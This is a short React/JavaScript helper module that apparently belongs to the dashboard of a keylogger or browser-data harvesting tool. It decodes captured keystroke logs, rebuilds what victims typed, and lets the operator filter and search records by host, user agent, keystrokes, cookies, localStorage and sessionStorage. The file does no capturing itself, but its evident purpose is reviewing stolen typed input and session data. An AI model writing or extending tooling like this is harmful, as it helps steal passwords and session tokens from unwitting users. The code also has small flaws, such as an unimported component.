import React from 'react';
import moment from 'moment-timezone';
import { uniq } from 'lodash';

export const delayedClosePopover = setOpen => {
  setOpen(true);
  setTimeout(() => {
    setOpen(false);
  }, [5000]);
};

const BACKSPACE = 'Backspace';
const ENTER = 'Enter';

export const parseKeystrokes = (keystrokes, processKeys = false) => {
  const decodedKeystrokes = JSON.parse(atob(keystrokes));
  if (processKeys) {
    const processed = decodedKeystrokes
      .filter(key => key.length < 2 || key === ENTER || key === BACKSPACE)
      .map(key => (key === ENTER ? '\n' : key));
    const deleted = [];
    processed.forEach(key => (key !== BACKSPACE ? deleted.push(key) : deleted.pop()));
    return deleted.join('');
  }
  return decodedKeystrokes.map(key =>
    key.length > 1 ? (
      <Code colorScheme='green' margin='1px'>
        {key.toUpperCase()}
      </Code>
    ) : (
      key
    ),
  );
};

export const getHosts = logs => uniq(logs?.map(({ host }) => host));

export const filterLogs = (logs, host) => logs.filter(log => (host ? log.host === host : log));

export const processLogs = logs =>
  logs.map(log => ({
    ...log,
    keystrokes: parseKeystrokes(log.keystrokes),
  }));

export const searchKeystrokes = (logs, searchTerm) =>
  logs.filter(
    log =>
      [
        log.host,
        moment(log.created_at).format('MMM DD, YYYY hh:mm a'),
        log.user_agent,
        JSON.parse(atob(log.keystrokes)).join(''),
        atob(log.cookies),
        atob(log.local_storage),
        atob(log.session_storage),
      ]
        .join('')
        .toLowerCase()
        .indexOf(searchTerm.toLowerCase()) > -1,
  );
